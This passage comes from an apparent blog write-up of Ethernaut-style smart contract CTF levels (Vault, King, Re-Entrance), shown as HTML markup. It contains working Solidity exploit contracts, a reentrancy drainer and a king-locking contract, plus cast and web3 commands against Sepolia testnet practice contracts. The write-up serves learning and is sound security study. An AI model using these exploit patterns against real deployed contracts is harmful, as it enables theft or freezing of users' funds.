&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;web3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getStorageAt&lt;&#x2F;span&gt;&lt;span&gt;(contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; cast send 0x2aEB3659dae953F1E6479F1080293285575e4426 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;unlock(bytes32)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; -r https:&#x2F;&#x2F;ethereum-sepolia.publicnode.com --private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;64&lt;&#x2F;span&gt;&lt;span&gt;byteskey&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;blockHash&lt;&#x2F;span&gt;&lt;span&gt;               0xfd32fdacac580b386cfc23eb61e8c3f43e0fd53a933d0e7be00efe457be78173
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;blockNumber&lt;&#x2F;span&gt;&lt;span&gt;             4501800
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;contractAddress         
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cumulativeGasUsed&lt;&#x2F;span&gt;&lt;span&gt;       1921303
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;effectiveGasPrice&lt;&#x2F;span&gt;&lt;span&gt;       10926752295
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gasUsed&lt;&#x2F;span&gt;&lt;span&gt;                 24143
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;logs                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;[]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;logsBloom&lt;&#x2F;span&gt;&lt;span&gt;               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;root                    
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;status&lt;&#x2F;span&gt;&lt;span&gt;                  1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transactionHash&lt;&#x2F;span&gt;&lt;span&gt;         0x4a381bd75ab79e4196104de62c5dc0453d18596260b83b7368ff1689b2d98a76
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transactionIndex&lt;&#x2F;span&gt;&lt;span&gt;        14
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;                    2
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;em&gt;Foundry Toolkit excellent&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;the rpc url above found by https:&#x2F;&#x2F;chainlist.org&#x2F;chain&#x2F;11155111&lt;&#x2F;p&gt;
&lt;h2 id=&quot;king&quot;&gt;King&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;King &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; king;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint public&lt;&#x2F;span&gt;&lt;span&gt; prize;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; owner;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;  
&lt;&#x2F;span&gt;&lt;span&gt;    king &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    prize &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  receive() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;value &amp;gt;=&lt;&#x2F;span&gt;&lt;span&gt; prize &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;|| msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender ==&lt;&#x2F;span&gt;&lt;span&gt; owner);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(king).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    king &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    prize &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;_king&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    return king;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;In this contract, we can become the new king by paying more than prize, while the owner can become the new king through his identity without paying.&lt;&#x2F;p&gt;
&lt;p&gt;In ethereum world, EOA can receive eth at any time, but if the CA haven’t declared the payable function &lt;code&gt;receive()&lt;&#x2F;code&gt; or &lt;code&gt;fallback()&lt;&#x2F;code&gt;, or just actively  &lt;code&gt;revert()&lt;&#x2F;code&gt;, the transcation would failed. And it will cause a rollback of the Ethereum state machine with the below code not executed (That is to say, the value of the king variable can no longer be changed). That’s what needed in solving this challenge.&lt;&#x2F;p&gt;
&lt;p&gt;check the current prize:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; await &lt;&#x2F;span&gt;&lt;span&gt;web3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getStorageAt&lt;&#x2F;span&gt;&lt;span&gt;(contract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;0x00000000000000000000000000000000000000000000000000038d7ea4c68000&amp;#39;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x38d7ea4c68000&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;toString&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;16
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;deploy the following contract with &lt;code&gt;&amp;gt;=0.001 eth&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;.&#x2F;King.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Newking&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    King _king;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address payable &lt;&#x2F;span&gt;&lt;span&gt;_address) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        _king &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;King&lt;&#x2F;span&gt;&lt;span&gt;(_address);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(_king).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;{value: _king.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;prize&lt;&#x2F;span&gt;&lt;span&gt;()}(&amp;quot;&amp;quot;); &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; triggering the receive() function on King contract with the msg.value as prize
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;re-entrance&quot;&gt;Re-Entrance&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.6.12&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;#39;openzeppelin-contracts-06&#x2F;math&#x2F;SafeMath.sol&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Reentrance &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  using SafeMath for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  mapping(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt; balances;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;donate&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_to) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    balances[_to] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; balances[_to].&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_who) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public view &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; balance) {
&lt;&#x2F;span&gt;&lt;span&gt;    return balances[_who];
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;_amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    if(balances[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;=&lt;&#x2F;span&gt;&lt;span&gt; _amount) {
&lt;&#x2F;span&gt;&lt;span&gt;      (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; result,) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;{value:_amount}(&amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;      if(result) {
&lt;&#x2F;span&gt;&lt;span&gt;        _amount;
&lt;&#x2F;span&gt;&lt;span&gt;      }
&lt;&#x2F;span&gt;&lt;span&gt;      balances[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-=&lt;&#x2F;span&gt;&lt;span&gt; _amount;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  receive() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Classic Reentrance-Attack.&lt;&#x2F;p&gt;
&lt;p&gt;In my understanding, Reentrance-Attack is similar to the race-condition attack in web2 application. Due to the contract operating mechanism of Ethereum, if the transaction address in the contract is another contract, the receive or fallback code of that contract will be executed first, and the state machine will not be updated at this moment. The back calling to this victim contract in receive function would bypass the state check.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&amp;gt; await getBalance(contract.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt; 0.001
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.6.12&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;#39;.&#x2F;Reentrance.sol&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Reeentrance &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    Reentrance _reentrance;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address payable &lt;&#x2F;span&gt;&lt;span&gt;_address) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        _reentrance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Reentrance&lt;&#x2F;span&gt;&lt;span&gt;(_address);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;attack &lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(_reentrance).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;{value: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;100000000000000&lt;&#x2F;span&gt;&lt;span&gt;}(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;abi&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;encodeWithSelector&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes4&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;donate(address)&amp;quot;)), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)));
&lt;&#x2F;span&gt;&lt;span&gt;        _reentrance.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;100000000000000&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    receive () &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        if(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(_reentrance).balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) _reentrance.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;100000000000000&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;A word after solving the challenge.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
